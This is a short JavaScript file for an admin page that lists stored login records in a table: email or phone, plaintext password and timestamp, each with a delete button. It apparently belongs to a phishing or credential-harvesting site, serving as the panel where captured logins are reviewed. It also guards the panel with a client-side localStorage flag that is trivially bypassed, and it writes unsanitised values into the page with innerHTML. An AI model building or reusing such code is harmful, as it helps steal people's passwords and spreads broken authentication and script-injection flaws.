document.addEventListener('DOMContentLoaded', function() {
    // Check if admin is logged in
    if (localStorage.getItem('adminLoggedIn') !== 'true') {
        window.location.href = 'etohbeeb.html'; // Redirect to login if not logged in
        return;
    }

    const allLoginDetails = JSON.parse(localStorage.getItem('allLoginDetails')) || [];
    console.log('Retrieved login details:', allLoginDetails);

    const loginDetailsTable = document.getElementById('loginDetails');
    if (allLoginDetails.length > 0) {
        allLoginDetails.forEach((details, index) => {
            loginDetailsTable.innerHTML += `
                <tr data-index="${index}">
                    <td data-label="Email or Phone">${details.emailOrPhone}</td>
                    <td data-label="Password">${details.password}</td>
                    <td data-label="Timestamp">${details.timestamp}</td>
                    <td data-label="Actions"><button class="delete-btn" data-index="${index}">Delete</button></td>
                </tr>
            `;
        });
    } else {
        loginDetailsTable.innerHTML = '<tr><td colspan="4">No login details found!</td></tr>';
    }

    // Add event listeners to delete buttons
    const deleteButtons = document.querySelectorAll('.delete-btn');
    deleteButtons.forEach(button => {
        button.addEventListener('click', function() {
            const index = this.getAttribute('data-index');
            deleteLoginDetail(index);
        });
    });
});

function deleteLoginDetail(index) {
    const allLoginDetails = JSON.parse(localStorage.getItem('allLoginDetails')) || [];
    allLoginDetails.splice(index, 1); // Remove the item at the specified index
    localStorage.setItem('allLoginDetails', JSON.stringify(allLoginDetails));
    location.reload(); // Reload the page to update the table
}